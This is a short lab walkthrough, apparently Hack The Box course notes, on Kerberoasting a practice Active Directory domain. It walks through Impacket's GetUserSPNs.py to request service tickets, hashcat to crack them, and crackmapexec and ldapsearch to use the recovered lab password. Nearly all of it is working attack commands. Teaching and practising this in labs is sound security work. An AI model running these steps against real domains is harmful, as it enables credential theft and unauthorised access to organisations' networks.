## Kerberoasting with GetUserSPNs.py

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

Let's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:

#### Installing Impacket using Pip

  Installing Impacket using Pip

```shell-session
Tachipy@htb[/htb]$ sudo python3 -m pip install .
```
#### Listing SPN Accounts with GetUserSPNs.py

  Listing SPN Accounts with GetUserSPNs.py

```shell-session
Tachipy@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
```
#### Requesting all TGS Tickets

  Requesting all TGS Tickets

```shell-session
Tachipy@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
#### Requesting a Single TGS ticket

  Requesting a Single TGS ticket

```shell-session
Tachipy@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request-user SAPService
```
#### Saving the TGS Ticket to an Output File

  Saving the TGS Ticket to an Output File

```shell-session
Tachipy@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request-user SAPService -outputfile sqldev_tgs
```
#### Cracking the Ticket Offline with Hashcat

  Cracking the Ticket Offline with Hashcat

```shell-session
Tachipy@htb[/htb]$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```
#### Testing Authentication against a Domain Controller

```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u SAPService -p !SapperFi2
```

#### Get User Membership
```shell
ldapsearch -h 172.16.5.5 -D "CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL" -w '!SapperFi2' -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(sAMAccountName=SAPService)" memberOf

```